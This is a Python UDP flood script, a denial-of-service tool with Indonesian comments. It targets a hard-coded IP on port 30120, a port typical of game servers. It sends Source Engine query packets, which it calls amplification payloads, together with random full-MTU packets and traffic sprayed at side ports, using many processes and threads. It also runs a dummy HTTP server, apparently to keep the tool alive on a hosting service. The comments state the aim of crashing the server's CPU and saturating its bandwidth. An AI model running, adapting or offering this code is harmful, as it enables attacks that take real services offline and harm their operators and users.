import multiprocessing
import threading
import socket
import random
import os
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

# --- CONFIG FROM ENVIRONMENT ---
target_ip = os.getenv("TARGET_IP", "62.146.239.123")
target_port = int(os.getenv("TARGET_PORT", "30120"))
num_processes = int(os.getenv("PROCES", "15")) 
threads_per_proc = int(os.getenv("THREADS", "10"))
port_http = int(os.getenv("PORT", "8080"))

# Payload Amplification (Bikin respon server jauh lebih besar dari request kita)
PAYLOADS = [
    b'\xff\xff\xff\xffTSource Engine Query\x00',
    b'\xff\xff\xff\xffgetstatus',
    b'\xff\xff\xff\xffgetinfo',
    b'\xff\xff\xff\xffU\xff\xff\xff\xff', # A2S_PLAYER (Amplified)
    b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00',
]

def power_flood(ip, port):
    # Optimasi Socket Level
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4096 * 1024) # Buffer 4MB per socket
    
    # Paket Fragmentation (Ukuran 1472-1500 bikin MTU penuh)
    heavy_packet = random._urandom(1472)
    
    while True:
        try:
            # 1. Tembak VSE Amplification (Hancurin CPU Server)
            s.sendto(random.choice(PAYLOADS), (ip, port))
            
            # 2. Tembak Paket Fragmentation (Hancurin Jalur ISP/Pipa Bandwidth)
            s.sendto(heavy_packet, (ip, port))
            
            # 3. Side-Port Attack (Bikin Firewall bingung jaga port mana)
            if random.random() > 0.7:
                s.sendto(heavy_packet, (ip, random.choice([port, port+1, 80, 443])))
        except:
            pass

def worker(ip, port, threads):
    for _ in range(threads):
        threading.Thread(target=power_flood, args=(ip, port), daemon=True).start()
    while True: time.sleep(10)

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"VSE V4 EXTREME ACTIVE")

def run_dummy_server():
    server = HTTPServer(('0.0.0.0', port_http), Handler)
    server.serve_forever()

if __name__ == "__main__":
    print(f"--- VSE ULTIMATE V4 : HIGH PENETRATION ---")
    print(f"Target: {target_ip}:{target_port} | Power: {num_processes}x{threads_per_proc}")
    
    threading.Thread(target=run_dummy_server, daemon=True).start()

    for _ in range(num_processes):
        p = multiprocessing.Process(target=worker, args=(target_ip, target_port, threads_per_proc))
        p.daemon = True
        p.start()

    while True: time.sleep(10)
